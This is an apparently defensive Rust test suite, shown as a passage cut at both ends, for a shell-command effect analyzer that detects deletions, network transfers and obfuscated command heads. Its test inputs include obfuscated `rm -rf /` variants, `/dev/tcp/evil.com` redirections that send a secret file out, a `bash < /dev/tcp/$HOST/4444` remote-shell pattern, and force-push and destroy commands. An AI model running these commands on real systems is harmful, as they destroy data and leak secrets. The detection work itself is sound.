        "X=$(cat <<EOF\n\\$(which rm)\nEOF\n); $X file",
        r#""$(printf '%s' {l,s})" file"#,
        r#""$(printf '%s' {r,m})" file"#,
    ] {
        assert!(
            !computed_head(&shell(source, None)),
            "{source} should not be obfuscated"
        );
    }
    let plan = shell(r#""$(printf '%s' {r,m})" /victim"#, None);
    assert!(has_delete(&plan, "/victim"), "{:?}", plan.effects);
}

#[test]
fn captured_concealment_survives_export_and_child_shells() {
    // `export X=$(...)` binds through the same concealment path as a plain
    // assignment, and an exported concealed value stays marked when a child
    // shell imports it, so a later head use is still obfuscated.
    for source in [
        r#"export X=$(rev <<< mr); $X -rf /victim"#,
        r#"X=$(which rm); export X; sh -c '$X -rf /victim'"#,
        r#"X=$(rev <<< mr); export X; sh -c '$X -rf /victim'"#,
    ] {
        assert!(
            computed_head(&shell(source, None)),
            "{source} should be obfuscated"
        );
    }
    // A transparent export recovers the literal head and keeps its effect,
    // so the deletion survives and there is no obfuscation fact.
    for source in [
        r#"export X=$(echo rm); $X /victim"#,
        r#"export X=$(printf rm); "$X" /victim"#,
        r#"X=$(echo rm); export X; sh -c '$X /victim'"#,
    ] {
        let plan = shell(source, None);
        assert!(!computed_head(&plan), "{source} should not be obfuscated");
        assert!(
            has_delete(&plan, "/victim"),
            "{source} should keep the deletion: {:?}",
            plan.effects
        );
    }
    // `env` forwards an inherited concealed name into its child, and a prefix
    // assignment that concealed the name marks the child head; a transparent
    // `env X=…`/prefix or an unset clears it.
    for (source, obfuscated) in [
        (
            r#"X=$(which rm); export X; env sh -c '$X -rf /victim'"#,
            true,
        ),
        (r#"X=$(which rm) sh -c '$X -rf /victim'"#, true),
        (
            r#"X=$(which rm); export X; env X=ls sh -c '$X /victim'"#,
            false,
        ),
        (
            r#"X=$(which rm); export X; env -u X sh -c '$X /victim'"#,
            false,
        ),
        (r#"X=$(which rm); export X; X=ls sh -c '$X /victim'"#, false),
        // A prefix assignment before the `export` builtin persists in the
        // current shell: a concealing capture marks the later head, and a
        // transparent literal clears an inherited mark.
        (r#"X=ls; X=$(which rm) export X; $X -rf /victim"#, true),
        (r#"X=$(which rm); X=ls export X; $X /victim"#, false),
        // `env -S` split-string assignments define a fresh value, so they
        // replace the forwarded concealment just as `env X=…` does.
        (
            r#"X=$(which rm); export X; env -S "X=ls sh -c" '$X /victim'"#,
            false,
        ),
    ] {
        assert_eq!(
            computed_head(&shell(source, None)),
            obfuscated,
            "{source} obfuscation should be {obfuscated}"
        );
    }
}

#[test]
fn conditional_transparent_reassignment_keeps_prior_concealment() {
    // On the path where the guarded transparent write did not run, the head is
    // still the concealed capture, so it stays marked.
    assert!(
        computed_head(&shell(
            r#"X=$(which rm); if test -f flag; then X=$(echo ls); fi; $X -rf /victim"#,
            None,
        )),
        "conditional reassignment should preserve concealment",
    );
    // A definite transparent overwrite replaces the capture and delegates.
    assert!(
        !computed_head(&shell(
            r#"X=$(which rm); X=$(echo ls); $X -rf /victim"#,
            None,
        )),
        "definite reassignment should clear concealment",
    );
    // Every arm of an exhaustive branch writes the same literal, so the
    // pre-branch concealed value is unreachable and the head clears.
    assert!(
        !computed_head(&shell(
            r#"X=$(which rm); if test -f flag; then X=ls; else X=ls; fi; $X file"#,
            None,
        )),
        "exhaustive same-literal reassignment should clear concealment",
    );
    // Arms writing different literals leave the concrete head unpinned, so it
    // stays marked (matching the reference binary).
    assert!(
        computed_head(&shell(
            r#"X=$(which rm); if test -f flag; then X=ls; else X=cat; fi; $X file"#,
            None,
        )),
        "differing-literal arms should keep concealment",
    );
    // Coverage extends across nested and `elif` joins and `export` assignments:
    // when every path writes the same source literal, the concealed value is
    // unreachable and the head clears.
    for source in [
        r#"X=$(which rm); if test -f a; then if test -f b; then X=ls; else X=ls; fi; else X=ls; fi; $X file"#,
        r#"X=$(which rm); if test -f a; then X=ls; elif test -f b; then X=ls; else X=ls; fi; $X file"#,
        r#"X=$(which rm); if test -f a; then export X=ls; else export X=ls; fi; $X file"#,
        r#"X=$(which rm); if test -f a; then export X=$(echo ls); else export X=$(echo ls); fi; $X file"#,
    ] {
        assert!(
            !computed_head(&shell(source, None)),
            "{source} should clear concealment",
        );
    }
    // A path that can still reach the concealed value keeps the mark: an
    // uncovered nested arm, a concealing arm, or a later conditional
    // concealing write that re-exposes it.
    for source in [
        r#"X=$(which rm); if test -f a; then if test -f b; then X=ls; fi; else X=ls; fi; $X -rf /victim"#,
        r#"X=$(which rm); if test -f a; then if test -f b; then X=ls; else X=$(which rm); fi; else X=ls; fi; $X -rf /victim"#,
        r#"X=$(which rm); if test -f a; then X=ls; else X=ls; fi; if test -f b; then X=$(which rm); fi; $X -rf /victim"#,
    ] {
        assert!(
            computed_head(&shell(source, None)),
            "{source} should keep concealment",
        );
    }
}

#[test]
fn custom_ifs_splits_only_expansion_characters() {
    // Only the `${IFS}`-produced characters split; the literal trailing slash
    // stays in its field, so the deletion target is the real root, and a
    // literal `/tmp/test` suffix is one path, not cwd-relative `tmp`/`test`.
    for source in [
        r#"IFS=/; rm${IFS}-rf${IFS}/"#,
        r#"IFS=,; rm${IFS}-rf${IFS}/"#,
        r#"IFS=r; rm${IFS}-rf${IFS}/"#,
    ] {
        let plan = shell(source, None);
        assert!(has_delete(&plan, "/"), "{source}: {:?}", plan.effects);
        assert!(computed_head(&plan), "{source}");
    }
    let plan = shell(r#"IFS=/; rm${IFS}-rf${IFS}/tmp/test"#, Some("/work"));
    assert!(has_delete(&plan, "/tmp/test"), "{:?}", plan.effects);
    assert!(computed_head(&plan));
}

#[test]
fn here_string_recovery_does_not_invent_a_tilde_path() {
    // A here-string undergoes tilde expansion, so `$(cat <<< ~)` is HOME, not
    // the literal `~`. Recovering a concrete `/work/~/.nah/trust.json` would
    // hide the real target, so the prefix stays unresolved instead.
    let plan = shell(r#"rm "$(cat <<< ~)/.nah/trust.json""#, Some("/work"));
    assert!(
        delete_resources(&plan).iter().all(|resource| !matches!(
            resource,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                if path.contains('~')
        )),
        "{:?}",
        plan.effects
    );
    // A here-string with no tilde still recovers exactly.
    assert!(has_delete(
        &shell(r#"rm "$(cat <<< /tmp/x)""#, Some("/work")),
        "/tmp/x"
    ));
}

#[test]
fn defining_demo_symbolic_env_and_unmodeled_nested() {
    let plan = shell(
        "rm -rf \"$TMPDIR/build\" && ./deploy.sh",
        Some("/work/repo"),
    );
    assert!(
        plan.execution_graph
            .nodes
            .iter()
            .any(|node| node.input.as_ref().is_some_and(|input| matches!(
                input.content,
                effinterp_proto::ExecutionContent::Unobserved {
                    reason: effinterp_proto::ExecutionInputReason::Stale
                }
            )))
    );
    let resources = delete_resources(&plan);
    let ResourceExpr::Join { parts } = resources[0] else {
        panic!("expected symbolic join, got {:?}", resources[0]);
    };
    assert!(matches!(&parts[0], ResourceExpr::Environment { name } if name == "TMPDIR"));
    assert!(
        plan.boundaries
            .iter()
            .any(|b| b.reason.as_str() == "unmodeled_command")
    );
    assert_eq!(
        plan.coverage.0[&Domain::new("filesystem")].level,
        CoverageLevel::None
    );
}

#[test]
fn quoting_protects_globs_and_splits() {
    let plan = shell("rm '*.txt'", Some("/w"));
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/w/*.txt"
    ));

    let plan = shell("rm *.txt", Some("/w"));
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. } } if pattern == "/w/*.txt"
    ));

    for (source, target) in [
        (r#"rm $'*.txt'"#, "/w/*.txt"),
        (r#"rm $'a b'"#, "/w/a b"),
        (r#"rm $''~/tmp"#, "/w/~/tmp"),
        (r#"a=($'a\')b'); rm "${a[@]}""#, "/w/a')b"),
        (r#"echo $(printf %s $'a\')b'; rm /inside)"#, "/inside"),
        (r#"rm $'a\'b'"#, "/w/a'b"),
        (r#"rm $'\057'"#, "/"),
        (r#"$'\162\155' -rf /"#, "/"),
        (r#"$'\562\555' -rf /"#, "/"),
        (r#"rm $'\u2f'"#, "/"),
        (r#"rm $'\U0000002f'"#, "/"),
        (r#"rm $'\x2f'e'tc'"#, "/etc"),
        (r#"bash -c $'rm\x20-rf\x20/'"#, "/"),
    ] {
        let plan = shell(source, Some("/w"));
        assert!(has_delete(&plan, target), "{source}: {:?}", plan.effects);
    }

    for source in [
        r#"printf %s $'$(rm -rf /)'"#,
        r#""$'rm -rf /'""#,
        r#"printf %s $''"#,
    ] {
        assert!(
            delete_resources(&shell(source, Some("/w"))).is_empty(),
            "{source}"
        );
    }
    for source in [
        r#"rm -rf $'\x00/'"#,
        r#"rm -rf $'\xff'"#,
        r#"rm -rf $'\u00e9'"#,
        r#"rm -rf $'\u'"#,
        r#"rm -rf $'\q/'"#,
    ] {
        let plan = shell(source, Some("/w"));
        assert!(!delete_resources(&plan).is_empty(), "{source}");
        assert!(
            delete_resources(&plan)
                .iter()
                .all(|resource| matches!(resource, ResourceExpr::Unresolved { .. })),
            "{source}: {:?}",
            plan.effects
        );
    }
    let plan = shell(r#"bash -c $'rm -rf /\xff'; rm /after"#, Some("/w"));
    assert_eq!(delete_resources(&plan).len(), 1);
    assert!(!plan.boundaries.is_empty());
    assert!(has_delete(&plan, "/after"));
}

#[test]
fn assignment_substitutes_into_later_command() {
    let plan = shell("D=/data; rm -r $D/logs", None);
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/data/logs"
    ));
    // Provenance for the delete must reach the assignment's source span.
    let delete = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(!delete.provenance.is_empty());
}

#[test]
fn unknown_variable_stays_symbolic() {
    let plan = shell("rm -r $UNSET_DIR", Some("/w"));
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Environment { name } if name == "UNSET_DIR"
    ));
}

#[test]
fn redirections_are_filesystem_effects() {
    let plan = shell("echo hi > out.log 2>err.log", Some("/w"));
    // echo is a quiet builtin: only the redirect effects appear.
    assert_eq!(ops(&plan), vec!["filesystem.write", "filesystem.write"]);
    assert_eq!(plan.execution_graph.nodes.len(), 1);

    let plan = shell("cat < in.txt >> out.txt", Some("/w"));
    assert!(ops(&plan).contains(&"filesystem.read"));
    let append = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "filesystem.write")
        .unwrap();
    assert_eq!(
        append.attributes["append"],
        effinterp_proto::AttrValue::Bool(true)
    );
}

#[test]
fn bare_redirect_truncates_file() {
    let plan = shell("> /tmp/cleared", None);
    assert_eq!(ops(&plan), vec!["filesystem.write"]);
}

#[test]
fn dup_redirect_has_no_filesystem_effect() {
    let plan = shell("ls 2>&1", Some("/w"));
    assert!(!ops(&plan).contains(&"filesystem.write"));
}

#[test]
fn socket_output_redirections_are_network_effects() {
    let tcp = shell("echo hi > /dev/tcp/evil.com/443", None);
    assert_eq!(ops(&tcp), vec!["network.connect", "network.upload"]);
    assert!(tcp.effects.iter().all(|effect| {
        matches!(
            &effect.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::NetworkEndpoint {
                    host,
                    scheme: None,
                    port: Some(443),
                    path: None,
                },
            } if host == "evil.com"
        ) && effect.attributes.get("protocol") == Some(&AttrValue::String("tcp".into()))
    }));

    let udp = shell("echo hi > /dev/udp/10.0.0.1/514", None);
    assert_eq!(ops(&udp), vec!["network.connect", "network.upload"]);
    assert!(udp.effects.iter().all(|effect| {
        effect.attributes.get("protocol") == Some(&AttrValue::String("udp".into()))
    }));
    assert_eq!(
        udp.coverage
            .0
            .get(&Domain::new("network"))
            .map(|claim| &claim.level),
        Some(&CoverageLevel::Full)
    );
    assert!(udp.coverage.is_full(&Domain::new("filesystem")));
    assert!(
        !udp.effects
            .iter()
            .any(|effect| effect.operation.domain() == "filesystem")
    );

    for source in [
        "echo hi >> /dev/tcp/evil.com/443",
        "echo hi &> /dev/tcp/evil.com/443",
    ] {
        let plan = shell(source, None);
        assert_eq!(ops(&plan), vec!["network.connect", "network.upload"]);
        assert!(
            plan.effects
                .iter()
                .all(|effect| !effect.attributes.contains_key("append"))
        );
    }
}

#[test]
fn socket_input_and_readwrite_emit_transfer_effects() {
    // bash opens the socket for both directions even for `<`.
    let input = shell("echo < /dev/tcp/evil.com/443", None);
    assert_eq!(
        ops(&input),
        vec!["network.connect", "network.download", "network.upload"]
    );

    let readwrite = shell("echo <> /dev/tcp/evil.com/443", None);
    assert_eq!(
        ops(&readwrite),
        vec!["network.connect", "network.download", "network.upload"]
    );
}

#[test]
fn socket_targets_preserve_service_names_and_symbolic_endpoints() {
    let service = shell("echo > /dev/tcp/evil.com/https", None);
    assert!(service.effects.iter().all(|effect| {
        matches!(
            &effect.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::NetworkEndpoint {
                    host,
                    scheme: None,
                    port: None,
                    path: None,
                },
            } if host == "evil.com"
        ) && effect.attributes.get("service") == Some(&AttrValue::String("https".into()))
    }));

    let symbolic = shell("echo > /dev/tcp/$HOST/$PORT", None);
    let network: Vec<_> = symbolic
        .effects
        .iter()
        .filter(|effect| effect.operation.0.starts_with("network."))
        .collect();
    assert_eq!(network.len(), 2);
    assert!(network.iter().all(|effect| {
        matches!(
            &effect.resource,
            ResourceExpr::Unresolved { family } if family.0 == "network"
        ) && effect.attributes.get("protocol") == Some(&AttrValue::String("tcp".into()))
    }));
    assert!(symbolic.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "dynamic_source"
            && boundary
                .detail
                .as_deref()
                .is_some_and(|detail| detail.contains("dynamic host or service"))
    }));
    assert_eq!(
        symbolic
            .coverage
            .0
            .get(&Domain::new("network"))
            .map(|claim| &claim.level),
        Some(&CoverageLevel::Partial)
    );
}

#[test]
fn observed_unset_socket_host_keeps_the_network_producer() {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "bash < /dev/tcp/$HOST/4444".into(),
            cwd: None,
            context: HostContext {
                env_unset: ["HOST".to_string()].into(),
                ..Default::default()
            },
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "network.download"
            && matches!(effect.resource, ResourceExpr::Unresolved { .. })
    }));
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "dynamic_source"
            && boundary.affected_resource
                == Some(ResourceExpr::Unresolved {
                    family: effinterp_proto::ResourceFamily::new("network"),
                })
    }));
}

#[test]
fn exec_socket_descriptors_emit_later_dup_transfers() {
    let inherited = shell(
        "exec 3<>/dev/tcp/evil.com/443; cat secret >&3; cat <&3",
        None,
    );
    let network_ops: Vec<_> = ops(&inherited)
        .into_iter()
        .filter(|operation| operation.starts_with("network."))
        .collect();
    assert_eq!(
        network_ops,
        vec![
            "network.connect",
            "network.download",
            "network.upload",
            "network.upload",
            "network.download"
        ]
    );

    let copied = shell(
        "exec 3<>/dev/tcp/evil.com/443; exec 4>&3; echo hi >&4",
        None,
    );
    assert_eq!(
        ops(&copied)
            .into_iter()
            .filter(|operation| operation.starts_with("network."))
            .collect::<Vec<_>>(),
        vec![
            "network.connect",
            "network.download",
            "network.upload",
            "network.upload"
        ]
    );
}

#[test]
fn exec_socket_descriptor_lifecycle_respects_close_rebind_and_pipelines() {
    let closed = shell(
        "exec 3<>/dev/tcp/evil.com/443; exec 3>&-; echo hi >&3",
        None,
    );
    assert_eq!(
        ops(&closed)
            .into_iter()
            .filter(|operation| operation.starts_with("network."))
            .collect::<Vec<_>>(),
        vec!["network.connect", "network.download", "network.upload"]
    );

    let rebound = shell(
        "exec 3<>/dev/tcp/evil.com/443; exec 3>out; echo hi >&3",
        None,
    );
    assert_eq!(
        ops(&rebound)
            .into_iter()
            .filter(|operation| operation.starts_with("network."))
            .collect::<Vec<_>>(),
        vec!["network.connect", "network.download", "network.upload"]
    );

    let pipeline = shell("exec 3<>/dev/tcp/evil.com/443 | echo; echo hi >&3", None);
    assert_eq!(
        ops(&pipeline)
            .into_iter()
            .filter(|operation| operation.starts_with("network."))
            .collect::<Vec<_>>(),
        vec!["network.connect", "network.download", "network.upload"]
    );

    let ordered_rebind = shell("exec 3<>/dev/tcp/evil.com/443; echo hi 3>out >&3", None);
    assert!(ops(&ordered_rebind).contains(&"filesystem.write"));
    assert_eq!(
        ops(&ordered_rebind)
            .into_iter()
            .filter(|operation| operation.starts_with("network."))
            .collect::<Vec<_>>(),
        vec!["network.connect", "network.download", "network.upload"]
    );

    let copied_in_command = shell("exec 3<>/dev/tcp/evil.com/443; echo hi 4>&3 >&4", None);
    assert_eq!(
        ops(&copied_in_command)
            .into_iter()
            .filter(|operation| operation.starts_with("network."))
            .collect::<Vec<_>>(),
        vec![
            "network.connect",
            "network.download",
            "network.upload",
            "network.upload"
        ]
    );
}

#[test]
fn non_socket_dev_targets_remain_filesystem_effects() {
    for (source, operation) in [
        ("echo hi > /dev/null", "filesystem.write"),
        ("echo < /dev/zero", "filesystem.read"),
        ("echo < /dev/sda", "filesystem.read"),
        ("echo hi > /dev/tcp", "filesystem.write"),
        ("echo hi > /dev/tcp/evil.com", "filesystem.write"),
        ("echo hi > /dev/tcp/h/p/x", "filesystem.write"),
        ("echo hi > dev/tcp/h/443", "filesystem.write"),
    ] {
        let plan = shell(source, None);
        assert_eq!(ops(&plan), vec![operation]);
        assert!(!plan.coverage.0.contains_key(&Domain::new("network")));
    }
}

#[test]
fn cd_updates_cwd_for_later_commands() {
    let plan = shell("cd /srv && rm -r data", Some("/w"));
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/srv/data"
    ));
}

#[test]
fn cd_to_unknown_degrades_to_symbolic() {
    let plan = shell("cd $DIR && rm -r data", Some("/w"));
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Join { .. }
    ));
}

#[test]
fn directory_stack_builtins_update_or_invalidate_cwd() {
    let pushed = shell("pushd sub >/dev/null; python3 task.py", None);
    assert!(
        pushed.effects.iter().any(|effect| {
            matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process {
                        executable,
                        cwd: Some(cwd),
                        ..
                    }
                } if executable == "python3"
                    && matches!(cwd.as_ref(), ResourceExpr::Join { .. })
            )
        }),
        "{:#?}",
        pushed.effects
    );

    let popped = shell(
        "pushd sub >/dev/null; popd >/dev/null; python3 task.py",
        None,
    );
    assert!(popped.effects.iter().any(|effect| {
        matches!(
            &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process {
                        executable,
                        cwd: Some(cwd),
                        ..
                    }
                } if executable == "python3"
                    && matches!(cwd.as_ref(), ResourceExpr::Unresolved { .. })
        )
    }));

    let physical = shell("cd -P sub; python3 task.py", None);
    assert!(
        physical.effects.iter().any(|effect| {
            matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process {
                        executable,
                        cwd: Some(cwd),
                        ..
                    }
                } if executable == "python3"
                    && matches!(cwd.as_ref(), ResourceExpr::Join { .. })
            )
        }),
        "{:#?}",
        physical.effects
    );

    let no_chdir = shell("pushd -n sub; python3 task.py", None);
    assert!(no_chdir.effects.iter().any(|effect| {
        matches!(
            &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process {
                        executable,
                        cwd: None,
                        ..
                    }
                } if executable == "python3"
        )
    }));
}

#[test]
fn cd_in_pipeline_does_not_persist() {
    let plan = shell("cd /srv | cat; rm x", Some("/w"));
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/w/x"
    ));
}

#[test]
fn tilde_expands_to_home() {
    let plan = shell("rm -rf ~/tmp", None);
    let ResourceExpr::Join { parts } = delete_resources(&plan)[0] else {
        panic!("expected join");
    };
    assert!(matches!(&parts[0], ResourceExpr::Environment { name } if name == "HOME"));
    for plan in [
        shell("rm -rf ~test", Some("/workspace/project")),
        shell_with_env("rm -rf ~test", &[("HOME", "/home/test")]),
    ] {
        assert!(matches!(
            delete_resources(&plan)[0],
            ResourceExpr::Unresolved { .. }
        ));
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unresolved_source")
        );
    }
    let plan = shell("cd ~; rm -rf .", Some("/workspace/project"));
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "environment.read")
    );
    assert!(
        matches!(delete_resources(&plan)[0], ResourceExpr::Join { parts } if parts.iter().any(|part| matches!(part, ResourceExpr::Environment { name } if name == "HOME")))
    );
}

#[test]
fn command_substitutions_are_nested_and_preserve_effects() {
    let plan = shell("rm $(find /tmp -name '*.old')", Some("/w"));
    // The inner find is analyzed as a nested shell subject.
    assert!(plan.execution_graph.nodes.iter().any(|n| matches!(
        &n.subject,
        Subject::Shell { source, .. } if source.contains("find")
    )));
    // The outer rm operand is unresolved.
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Unresolved { .. }
    ));

    let read_file = shell("echo $(<source/server.key)", Some("/w"));
    assert!(read_file.effects.iter().any(|effect| matches!(
        &effect.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        } if effect.operation.0 == "filesystem.read" && path == "/w/source/server.key"
    )));
    assert!(read_file.execution_graph.nodes.iter().any(|node| matches!(
        &node.subject,
        Subject::Shell { source, .. } if source == "<source/server.key"
    )));
}

#[test]
fn control_flow_body_effects_are_collected() {
    let plan = shell("if test -f x; then rm x; fi; rm y", Some("/w"));
    // The delete inside the then-branch surfaces along with the one after.
    let deletes = delete_resources(&plan);
    assert!(deletes.iter().any(|r| matches!(
        r,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/w/x"
    )));
    assert!(deletes.iter().any(|r| matches!(
        r,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/w/y"
    )));
    // `test` is an effectless builtin and the branch is fully modeled, so the
    // construct is no longer a boundary.
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|b| b.reason.as_str() == "unsupported_shell_syntax"
                || b.reason.as_str() == "unmodeled_command")
    );
}

#[test]
fn unterminated_quote_is_a_parse_boundary() {
    let plan = shell("rm x; echo 'unclosed", Some("/w"));
    assert!(
        plan.boundaries
            .iter()
            .any(|b| b.reason.as_str() == "parse_error")
    );
    // The command before the error is preserved.
    assert!(!delete_resources(&plan).is_empty());
}

#[test]
fn garbage_input_never_panics() {
    for source in [
        "",
        "   ",
        ")))",
        "|||",
        "((((",
        "echo \x01\u{fffd}\x7f",
        "$",
        "${",
        "$((",
        "`",
        "\\",
        "a=b=c=d",
        "<<<",
        "> > >",
        "&&&&",
        "if if if",
        "🦀 🦀",
    ] {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: None,
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan for {source:?}: {e:?}"));
    }
}

#[test]
fn deep_substitution_saturates_depth_limit() {
    let mut source = String::from("rm x");
    for _ in 0..20 {
        source = format!("echo $({source})");
    }
    let plan = shell(&source, Some("/w"));
    assert!(
        plan.boundaries
            .iter()
            .any(|b| b.limit.as_deref() == Some("max_execution_depth"))
    );
}

#[test]
fn many_commands_saturate_invocation_limit() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".into(), 8);
    let source = vec!["ls"; 40].join("; ");
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source,
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(
        plan.boundaries
            .iter()
            .any(|b| b.limit.as_deref() == Some("max_execution_nodes"))
    );
    assert_eq!(
        plan.coverage.0[&Domain::new("process")].level,
        CoverageLevel::Partial
    );
}

#[test]
fn oversized_source_is_fully_opaque() {
    let mut limits = default_limits();
    limits.insert("max_source_bytes".to_string(), 10);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "rm -rf / # much longer than ten bytes".into(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(plan.effects.is_empty());
    assert!(
        plan.boundaries
            .iter()
            .any(|b| b.limit.as_deref() == Some("max_source_bytes"))
    );
    assert_eq!(
        plan.coverage.0[&Domain::new("filesystem")].level,
        CoverageLevel::None
    );
}

#[test]
fn export_is_an_environment_effect() {
    let plan = shell("export PATH=/opt/bin", None);
    assert_eq!(ops(&plan), vec!["environment.write"]);
    assert!(matches!(
        &plan.effects[0].resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::EnvironmentVariable { name }
        } if name == "PATH"
    ));
}

#[test]
fn export_function_flag_is_not_a_variable_name() {
    // `export -f run_case` exports the FUNCTION run_case; the -f flag must not
    // be bound as a variable named "-f".
    let plan = shell("run_case() { :; }\nexport -f run_case", None);
    let names: Vec<&str> = plan
        .effects
        .iter()
        .filter(|e| e.operation.0 == "environment.write")
        .filter_map(|e| match &e.resource {
            ResourceExpr::Concrete {
                identity: ResourceIdentity::EnvironmentVariable { name },
            } => Some(name.as_str()),
            _ => None,
        })
        .collect();
    assert!(!names.contains(&"-f"), "got {names:?}");
    assert!(names.contains(&"run_case"), "got {names:?}");
}

#[test]
fn complete_and_hash_are_inert_builtins() {
    // Both are shell builtins: no external process named `complete` or `hash`
    // is ever executed.
    let plan = shell(
        "complete -o default -F _colorls_complete colorls\n! hash certstrap 2>/dev/null",
        None,
    );
    assert!(
        !plan.effects.iter().any(|e| e.operation.0 == "process.exec"),
        "builtins must not claim process.exec: {:?}",
        ops(&plan)
    );
}

#[test]
fn exported_value_substitutes_later() {
    let plan = shell("export D=/data; rm -r $D", None);
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/data"
    ));
}

#[test]
fn shell_analysis_is_deterministic() {
    let subject = Subject::Shell {
        source: "D=/x; rm -r $D/*.log && cat $(ls) > out".into(),
        cwd: Some("/w".into()),
        context: Default::default(),
    };
    let engine = Engine::new().with_causality_detail(true);
    let a = effinterp_proto::canonical_json(&engine.analyze(&subject).unwrap());
    let b = effinterp_proto::canonical_json(&engine.analyze(&subject).unwrap());
    assert_eq!(a, b);
}

#[test]
fn heredoc_does_not_discard_the_rest_of_the_script() {
    // A delimited heredoc is skipped; later commands are still analyzed.
    let plan = shell("cat <<EOF\nhello\nEOF\nrm x", Some("/w"));
    assert!(has_delete(&plan, "/w/x"));
    assert!(
        plan.boundaries
            .iter()
            .all(|boundary| boundary.reason.as_str() != "parse_error")
    );
    // nvm: `done <<EOF` must not swallow the rest of the script.
    let plan = shell(
        "while read l; do true; done <<EOF\nline\nEOF\ncurl -o /tmp/x https://h/f",
        None,
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0.starts_with("network.")),
        "command after done <<EOF should still run, got {:?}",
        ops(&plan)
    );
    assert!(
        plan.boundaries
            .iter()
            .all(|boundary| boundary.reason.as_str() != "parse_error")
    );
}

#[test]
fn pipeline_analyzes_every_stage() {
    let plan = shell("cat a.txt | rm -f b.txt", Some("/w"));
    assert_eq!(plan.execution_graph.nodes.len(), 3);
    assert!(ops(&plan).contains(&"filesystem.read"));
    assert!(ops(&plan).contains(&"filesystem.delete"));
}

#[test]
fn earlier_stage_boundaries_do_not_hide_later_destructive_effects() {
    for source in [
        "npm test; git reset --hard",
        "npm test && git reset --hard",
        "npm test | git reset --hard",
        "(npm test && git reset --hard)",
    ] {
        let plan = shell(source, Some("/workspace/project"));
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unresolved_package_script"),
            "{source}: {:?}",
            plan.boundaries
        );
        let reset = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "git.reset_request")
            .unwrap_or_else(|| panic!("{source}: {:?}", plan.effects));
        assert_eq!(reset.attributes.get("hard"), Some(&AttrValue::Bool(true)));
        assert_eq!(
            plan.coverage.level(&Domain::new("git")),
            Some(CoverageLevel::Partial),
            "{source}"
        );
    }

    for (source, boundary, operation, active_attribute, coverage_domain) in [
        (
            "cargo build && docker compose down -v",
            "unresolved_build_target",
            "container.remove",
            "volumes",
            "container",
        ),
        (
            "terraform -chdir=environments/dev validate && terraform -chdir=environments/dev destroy -auto-approve",
            "partial_analysis",
            "cloud.resource.delete",
            "whole_stack",
            "cloud",
        ),
        (
            "git fetch origin main && git push --force origin HEAD:main",
            "unmodeled_hooks",
            "git.push_request",
            "force",
            "process",
        ),
        (
            "source ./unknown.sh && git reset --hard",
            "unresolved_source",
            "git.reset_request",
            "hard",
            "process",
        ),
    ] {
        let plan = shell(source, Some("/workspace/project"));
        assert!(
            plan.boundaries
                .iter()
                .any(|candidate| candidate.reason.as_str() == boundary),
            "{source}: {:?}",
            plan.boundaries
        );
        let effect = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == operation)
            .unwrap_or_else(|| panic!("{source}: {:?}", plan.effects));
        assert_eq!(
            effect.attributes.get(active_attribute),
            Some(&AttrValue::Bool(true)),
            "{source}"
        );
        assert_eq!(
            plan.coverage.level(&Domain::new(coverage_domain)),
            Some(CoverageLevel::Partial),
            "{source}"
        );
    }
}

#[test]
fn subshell_cwd_reaches_every_later_stage() {
    let plan = shell(
        "(cd /workspace/project && git status && git reset --hard)",
        Some("/workspace/project"),
    );
    let reset = plan
        .effects
        .iter()
